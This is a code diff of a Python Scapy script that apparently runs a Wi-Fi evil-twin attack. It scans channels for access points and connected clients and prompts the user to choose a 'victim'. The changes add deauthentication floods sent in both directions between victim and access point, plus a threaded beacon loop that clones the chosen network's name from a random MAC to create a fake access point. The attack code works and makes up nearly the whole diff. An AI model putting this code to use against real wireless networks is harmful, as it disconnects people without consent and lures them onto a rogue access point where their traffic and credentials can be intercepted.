@@ -1,16 +1,14 @@
 from scapy.all import *
 import os
 import sys
-import sys
 import time
-import random
 from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt
 import change_modes
 import helper
 
 """
-Information learned:
-addr1: destination MAC , addr2: source MAC,  addr3: AP MAC
+Information:
+addr1: destination/receiver MAC , addr2: source/sender MAC,  addr3: AP MAC
 """
 
 interface_name = ""
@@ -43,31 +41,36 @@ def users_handler(pkt):
         print(f"{len(users)}\t{pkt.addr1}")
 
 
-def scan_wlan(iface):
+def scan_wlan(iface, channel_range=15, timeout=1):
     print("\n\nScanning for access points...")
     print("Index\tAP Name\t\tMAC")
-    for channel in range(1, 15):
+    for channel in range(1, channel_range):
         helper.scan_channels(iface, channel)
-        sniff(iface=iface, count=0, prn=AP_handler, timeout=1)
+        sniff(iface=iface, count=0, prn=AP_handler, timeout=timeout)
 
 
-def scan_for_users(iface):
+def scan_for_users(iface, channel_range=3, timeout=10):
     print("\n\nScanning for users...")
     print("Index\tUser MAC")
-    for channel in range(1, 3):
+    for channel in range(1, channel_range):
         helper.scan_channels(iface, channel)
-        sniff(iface=iface, prn=users_handler, timeout=10)
+        sniff(iface=iface, prn=users_handler, timeout=timeout)
 
 
 def deauthenticate_victim(iface, victim_mac_addr, ap_mac_addr):
     # RadioTap is an additional layer, making it easier to transmit info between OSI Layers.
     # First layer being a 802.11 layer with our input info for the attack
-    # Second Layer being the Deauthentication DoS step: reason=1 -> unspecified reason
-    packet = RadioTap() \
-             / Dot11(addr1=victim_mac_addr, addr2=ap_mac_addr, addr3=ap_mac_addr) \
-             / Dot11Deauth(reason=1)
-    # Send 100 packets with a 0.1 interval between each packet to ensure proper de-authentication
-    sendp(packet, inter=0.1, count=100, iface=iface, verbose=1)
+    # Second Layer being the de-authentication DoS step: reason=1 -> unspecified reason
+    victim_packet = RadioTap() \
+                    /Dot11(addr1=victim_mac_addr, addr2=ap_mac_addr, addr3=ap_mac_addr) \
+                    /Dot11Deauth(reason=1)
+    ap_packet = RadioTap() \
+               /Dot11(addr1=ap_mac_addr, addr2=victim_mac_addr, addr3=ap_mac_addr) \
+               /Dot11Deauth(reason=1)
+    # Send 100 packets for each, with a 0.1 interval between each packet to ensure proper de-authentication
+    sendp(victim_packet, inter=0.1, count=100, iface=iface, verbose=1)
+    sendp(ap_packet, inter=0.1, count=100, iface=iface, verbose=1)
+
 
 
 def scan_captured_networks(ap_list, flag):
@@ -105,29 +108,51 @@ def choose_user_to_attack(user_list):
     try:
         chosen_user = int(input("Choose a user to attack from the list above: "))
         chosen_user = captured[chosen_user - 1][1]
-        print("Chosen User is ", chosen_user)
+        print("Chosen Victim is ", chosen_user)
     except:
-        print("ERROR: Choose a user with an index from the list above")
+        print("ERROR: Choose a useSr with an index from the list above")
         choose_user_to_attack(user_list)
 
     return chosen_user
 
 
+def send_beacon(iface, ssid, victim_mac_addr, mac, infinite=True):
+    # type=0:       management frame
+    # subtype=8:    beacon frame
+	dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
+	beacon = Dot11Beacon()  # init the beacon frame
+	essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))  # inject the ssid name
+	frame = RadioTap() / dot11 / beacon / essid	# add a RadioTap and stack all the layers
+	# send the frame
+	if infinite:
+		sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)
+	else:
+		sendp(frame, iface=iface, verbose=0)
+
+
+def create_fake_ap(iface, victim, ap_name):
+    global chosen_ap_mac
+    fake_mac_addr = RandMAC()
+    Thread(target=send_beacon, args=(iface, ap_name, victim, fake_mac_addr)).start()
+    print(f"\n*****\nFake AP Created:\nAP Name: {ap_name}\nMac Address: {fake_mac_addr}\n*****")
+
+
 def network_attack(iface):
-    global interface_name, ap_list, users
+    global interface_name, ap_list, users, victim
     interface_name = iface
     change_modes.init_attack_mode()
     change_modes.active_monitor_mode(iface)
 
-    scan_wlan(iface)
+    scan_wlan(iface, channel_range=3, timeout=1)
     chosen_ap = scan_captured_networks(ap_list, flag=False)
 
     # Found Access Points
     if chosen_ap != -1:
-        scan_for_users(iface)
+        scan_for_users(iface, channel_range=2, timeout=5)
         victim = choose_user_to_attack(users)
 
     deauthenticate_victim(iface, victim, chosen_ap_mac)
+    create_fake_ap(iface, victim, ap_name=chosen_ap[1])
 
 
 def defense_attack():
